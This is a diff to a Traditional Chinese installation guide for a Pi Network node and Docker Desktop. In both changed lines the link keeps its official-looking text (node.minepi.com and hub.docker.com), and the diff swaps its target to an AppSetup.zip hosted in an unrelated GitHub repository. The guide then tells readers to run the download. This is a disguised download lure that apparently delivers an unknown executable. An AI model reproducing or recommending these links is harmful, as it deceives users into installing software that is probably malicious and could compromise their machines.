@@ -100,7 +100,7 @@
 
 1、到官網下載(貼上下面鏈接到瀏覽器執行就下載`目前0.3.8版本)
 
-=>>  [node.minepi.com](https://github.com/berelium/bonkonauts.github.io/releases/download/release/AppSetup.zip)
+=>>  [node.minepi.com](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 下載後點擊執行
 
 
@@ -121,7 +121,7 @@
 2、點擊安裝 docker desktop (注意是桌面板，不要選錯)
 另外附上下載連接
 
-[https://hub.docker.com/editions/community/docker-ce-desktop-windows/](https://hub.docker.com/editions/community/docker-ce-desktop-windows/)
+[https://hub.docker.com/editions/community/docker-ce-desktop-windows/](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 
 3、會開始下載並安裝(會跳出白框)，過程中
 
